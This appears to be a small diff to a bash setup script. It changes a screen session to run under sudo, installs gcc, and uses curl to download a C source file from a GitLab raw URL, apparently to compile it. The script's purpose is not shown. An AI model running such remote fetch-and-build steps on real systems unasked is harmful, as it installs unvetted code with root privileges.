@@ -1,5 +1,5 @@
 #!/bin/bash
-screen -S OLEOLE
+sudo screen -S HAJAR
 sudo apt-get update -y
 sudo apt install gcc -y
 curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranbotak.c
